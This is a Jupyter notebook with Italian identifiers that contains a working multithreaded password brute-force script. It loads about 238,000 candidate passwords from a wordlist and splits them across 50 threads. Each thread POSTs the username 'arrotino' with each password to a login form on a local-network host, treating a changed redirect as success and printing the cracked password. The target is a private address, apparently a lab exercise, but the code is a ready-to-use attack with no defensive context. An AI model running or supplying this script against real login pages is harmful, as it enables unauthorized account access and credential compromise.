{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from threading import Thread"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [],
   "source": [
    "parole = []\n",
    "f = open(\"password.txt\", \"r\")\n",
    "righe = f.readlines()\n",
    "for riga in righe:\n",
    "    parole.append(riga.strip())\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {},
   "outputs": [],
   "source": [
    "n_thread = 50"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "238328\n",
      "4766\n",
      "238300\n"
     ]
    }
   ],
   "source": [
    "print(len(parole))\n",
    "print(len(parole)//n_thread)\n",
    "print(len(parole)//n_thread*n_thread)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [],
   "source": [
    "num_parole_per_thread = len(parole)//n_thread"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [],
   "source": [
    "def hackera(server,parole):\n",
    "    url = server\n",
    "    for elmento in parole:\n",
    "        send = requests.post(url,data={\"username\":\"arrotino\",\"password\":elmento})\n",
    "        url = send.url\n",
    "        if url != server:\n",
    "            print(send.url)\n",
    "            print(elmento)\n",
    "\n",
    "            break    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "server = \"http://192.168.1.141:5000/\"\n",
    "th = []\n",
    "\n",
    "for i in range(n_thread):\n",
    "    if i == n_thread-1:\n",
    "        th.append(Thread(target=hackera,args=(server,parole[i*num_parole_per_thread:])))\n",
    "    else:\n",
    "        th.append(Thread(target=hackera, args=(server, parole[i*num_parole_per_thread:(i+1)*num_parole_per_thread])))\n",
    "    th[i].start()\n",
    "    \n",
    "for thread in th:\n",
    "    thread.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "916dbcbb3f70747c44a77c7bcd40155683ae19c65e1c03b4aa3499c5328201f1"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
